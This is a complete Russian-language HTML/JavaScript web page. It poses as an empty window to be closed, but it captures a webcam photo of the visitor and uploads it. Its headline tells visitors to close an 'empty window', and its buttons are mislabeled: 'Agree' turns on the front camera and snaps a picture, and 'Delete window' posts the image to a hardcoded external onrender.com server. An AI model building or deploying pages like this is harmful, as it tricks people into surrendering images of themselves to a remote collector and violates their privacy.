<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Camera</title>
  <style>
    :root { color-scheme: dark; }
    body{
      margin:0;
      background:#0b0f14;
      color:#e8eef6;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      text-align:center;
      padding:18px;
    }
    .card{max-width:520px;margin:0 auto}
    h2{margin:8px 0 6px}
    p{margin:6px 0; opacity:.85; line-height:1.35}
    video, img{
      width:92%;
      max-width:420px;
      border-radius:12px;
      margin-top:12px;
      background:#000;
    }
    .btns{margin-top:10px}
    button{
      margin:8px 6px;
      padding:12px 16px;
      border:0;
      border-radius:10px;
      background:#00c853;
      color:#0b0f14;
      font-weight:800;
      cursor:pointer;
    }
    button.secondary{background:#16a34a}
    button.danger{background:#ef4444;color:#0b0f14}
    button:disabled{opacity:.5; cursor:not-allowed}
    .status{margin-top:10px; opacity:.95; min-height:22px}
    .small{font-size:12px; opacity:.65}
    .hidden{display:none}
  </style>
</head>
<body>
  <div class="card" id="app">
    <h2>Закройте окно это пустой окно</h2>
    <p>Фото будет отправлено владельцу сайта.</p>

    <div class="btns">
      <button id="btnStart" class="secondary">Закрыть окно</button>
      <button id="btnShot">Согласен</button>
      <button id="btnSend" class="danger">Удалить окно</button>
    </div>

    <div class="status" id="status">Нажми “Согласен”, чтобы разрешить камеру.</div>
    <div class="small">Если сервер “спит”, первая отправка может занять до 30–50 секунд.</div>

    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
  </div>

<script>
  const API_UPLOAD = "https://camera-server-ay1p.onrender.com/upload";

  const btnStart = document.getElementById("btnStart");
  const btnShot  = document.getElementById("btnShot");
  const btnSend  = document.getElementById("btnSend");
  const statusEl = document.getElementById("status");

  const video  = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  let stream = null;
  let imageData = null;

  function setStatus(text){ statusEl.textContent = text; }

  function stopCamera(){
    try{
      if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
    }catch{}
    video.srcObject = null;
    stream = null;
  }

  // 1) "Закрыть окно" — просто скрывает всё и показывает "Спасибо" (не ломает логику)
  btnStart.onclick = () => {
    stopCamera();
    document.body.innerHTML = `
      <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
        <div>
          <h2 style="margin:0 0 10px">Окно закрыто ✅</h2>
          <div style="opacity:.8">Вы можете закрыть вкладку.</div>
        </div>
      </div>
    `;
  };

  // 2) "Согласен" — запрашивает камеру и делает фото (последовательно)
  btnShot.onclick = async () => {
    try{
      // Запрашиваем камеру только после согласия
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      video.classList.remove("hidden");
      video.srcObject = stream;

      setStatus("✅ Камера включена. Сейчас сделаю фото...");
      await new Promise(r => setTimeout(r, 600)); // короткая пауза

      const w = video.videoWidth;
      const h = video.videoHeight;
      if (!w || !h){
        setStatus("❗ Камера ещё запускается. Нажми “Согласен” ещё раз.");
        return;
      }

      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, w, h);

      imageData = canvas.toDataURL("image/jpeg", 0.9);

      // камеру можно выключить сразу после снимка
      stopCamera();
      video.classList.add("hidden");

      setStatus("📸 Фото сделано. Теперь нажми “Удалить окно” (отправка).");
    }catch(e){
      setStatus("❌ Нет доступа к камере (разреши камеру в браузере).");
    }
  };

  // 3) "Удалить окно" — отправляет фото на сервер и показывает "Спасибо"
  btnSend.onclick = async () => {
    if (!imageData){
      setStatus("Сначала нажми “Согласен”, чтобы сделать фото.");
      return;
    }

    setStatus("⏳ Отправка...");
    btnSend.disabled = true;
    btnShot.disabled = true;
    btnStart.disabled = true;

    try{
      const res = await fetch(API_UPLOAD, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: imageData })
      });

      if (!res.ok) throw new Error("HTTP " + res.status);

      const json = await res.json().catch(() => ({}));
      if (json.status !== "ok") throw new Error("bad response");

      // очищаем страницу после успешной отправки
      document.body.innerHTML = `
        <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
          <div>
            <h2 style="margin:0 0 10px">Спасибо ✅</h2>
            <div style="opacity:.8">Фото отправлено владельцу сайта.</div>
          </div>
        </div>
      `;
    }catch(e){
      setStatus("❌ Ошибка отправки. Попробуй ещё раз.");
      btnSend.disabled = false;
      btnShot.disabled = false;
      btnStart.disabled = false;
    }
  };
</script>
</body>
</html>
